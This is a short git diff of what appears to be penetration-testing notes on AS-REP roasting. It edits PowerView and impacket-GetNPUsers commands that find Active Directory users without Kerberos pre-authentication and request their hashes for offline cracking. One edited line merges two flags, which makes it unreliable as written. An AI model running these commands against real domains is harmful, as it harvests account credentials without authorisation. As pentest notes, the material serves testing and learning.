@@ -8,12 +8,13 @@ First we must identify Users that do not require Kerberos pre-auth. BloodHound w
 # PowerView
 Import-Module .\PowerView.ps1
 Get-DomainUser -PreauthNotRequired
-
+```
+```bash
 # impacket-GetNPUsers
-impacket-GetNPUsers -dc-ip <ip> <domain/user>
+impacket-GetNPUsers -dc-ip <ip> -no-pass <domain/user> -request-outputfile hashes.asreproast
 ```
 
-#### Linux Attack
+#### Authenticated Asreproast Attack
 ```bash
 impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast <domain>/<user>
 	# The user is who we are authenticating with
